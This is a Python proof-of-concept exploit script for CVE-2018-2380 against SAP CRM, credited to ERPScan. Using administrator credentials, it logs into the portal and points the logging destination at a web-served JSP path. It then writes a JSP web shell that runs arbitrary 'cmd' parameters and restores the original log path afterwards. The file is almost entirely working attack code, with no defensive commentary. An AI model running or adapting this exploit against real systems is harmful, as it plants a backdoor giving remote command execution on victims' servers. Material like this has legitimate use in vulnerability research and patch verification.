#!/usr/bin/env python
import argparse
import urllib

import requests, random
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
help_desc = '''
PoC of Remote Command Execution via Log injection on SAP CRM
-- ERPScan

python crm_rce.py --ssl --host 127.0.0.1 --port 50000 --username administrator --password 06071992 --SID DM0 --ssl true
'''
baner = '''
 _______  _______  _______  _______  _______  _______  _
(  ____ \(  ____ )(  ____ )(  ____ \(  ____ \(  ___  )( (    /|
| (    \/| (    )|| (    )|| (    \/| (    \/| (   ) ||  \  ( |
| (__    | (____)|| (____)|| (_____ | |      | (___) ||   \ | |
|  __)   |     __)|  _____)(_____  )| |      |  ___  || (\ \) |
| (      | (\ (   | (            ) || |      | (   ) || | \   |
| (____/\| ) \ \__| )      /\____) || (____/\| )   ( || )  \  |
(_______/|/   \__/|/       \_______)(_______/|/     \||/    )_)
Vahagn @vah_13 Vardanian
Bob @NewFranny
CVE-2018-2380

'''


def start(ip, port, username, password, sid, ssl):
    if ssl == None:
        base_scheme = 'http'
    else:
        base_scheme = 'https'
    req_adapter = requests.session()
    _server_ip_port = "{0}:{1}".format(ip, port)
    _username = username
    admin_password = password
    _headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": "{0}://{1}/b2b/admin/logging.jsp?location=com.sap.isa&mode=edit&index=1".format(
                    base_scheme,_server_ip_port)
                }

    # shell name
    _shell_name = "ERPScan_shell_{0}".format(random.randint(1337, 31337))

    # shell_code
    shell_code = '''
        <%@ page import="java.util.*,java.io.*"%>
        <%
        if (request.getParameter("cmd") != null) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
           }
        }
        %>
        '''
    # urls variables
    _irj_portal = "{0}://{1}/irj/portal".format(base_scheme,_server_ip_port)
    _b2b_admin_url = "{0}://{1}/b2b/admin/index.jsp".format(base_scheme,_server_ip_port)
    _url_of_log_path = "{0}://{1}/b2b/admin/logging.jsp".format(base_scheme,_server_ip_port)
    _url_write_shell_to_log_file = "{0}://{1}/b2b/init.do?\"%22]{2}[%22\"".format(base_scheme,_server_ip_port,urllib.quote_plus(shell_code))

    # data variable
    _post_data_restore_log_path = {"selConfigName": "com.sap.isa",
                                   "selSeverity": "0",
                                   "selDest": "./default_log_name.log",
                                   "selLimit": "10485760",
                                   "selCount": "20",
                                   "selFormatterType": "ListFormat",
                                   "selPattern": "none",
                                   "mode": "save",
                                   "selLocationIdx": "1"}
    _post_data_to_change_log_path = {"selConfigName": "com.sap.isa",
                                     "selSeverity": "0",
                                     "selDest": "C:\\usr\\sap\\{0}\\J00\\j2ee\\cluster\\apps\\sap.com\\com.sap.engine.docs.examples\\servlet_jsp\\_default\\root\\{1}.jsp".format(sid, _shell_name),
                                     "selLimit": "10485760",
                                     "selCount": "20",
                                     "selFormatterType": "ListFormat",
                                     "selPattern": "none",
                                     "mode": "save",
                                     "selLocationIdx": "1"}

    print("{0} \n[!] Try to get RCE using log injection ".format(baner))

    print("[!] Get j_salt token for requests")
    res = requests.get(_irj_portal, headers=_headers, verify=False)
    soup = BeautifulSoup(res.text, "html.parser")
    e = soup.find("input", {"name": "j_salt"})
    __j_salt = e['value']

    print("[!] Login to the SAP portal")
    req_adapter.post(_b2b_admin_url,
                     headers=_headers,
                     data={"login_submit": "on", "login_do_redirect": "1", "j_salt": __j_salt,
                           "j_username": "{0}".format(_username), "j_password": "{0}".format(admin_password),
                           "uidPasswordLogon": "Log On"}, verify=False)

    print("[!] Change log path ")
    req_adapter.post(_url_of_log_path, headers=_headers, data=_post_data_to_change_log_path)

    print("[!] Upload \"Runtime.getRuntime().exec(request.getParameter(\"cmd\")) \" shell to {0}://{1}/{2}.0.jsp?cmd=ipconfig".format(base_scheme,_server_ip_port, _shell_name))
    req_adapter.get(_url_write_shell_to_log_file, headers=_headers)

    print("[!] Restore logs path to ./default_log_name.log")
    req_adapter.post(_url_of_log_path, headers=_headers, data=_post_data_restore_log_path)

    print("[!] Enjoy!")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-H', '--host', default='127.0.0.1', help='SAP host to send requests to')
    parser.add_argument('-p', '--port', default=50000, type=int, help='SAP host port')

    parser.add_argument('-u', '--username', help='SAP CRM administrator')
    parser.add_argument('-pwd', '--password', help='SAP CRM administrator password')

    parser.add_argument('-s', '--SID', help='SAP SID')
    parser.add_argument('-S', '--ssl', help='Use ssl connection')

    args = parser.parse_args()
    args_dict = vars(args)

    host = args_dict['host']
    port = args_dict['port']
    username = args_dict['username']
    password = args_dict['password']
    sid = args_dict['SID']
    ssl = args.ssl
    start(host, port, username, password, sid, ssl)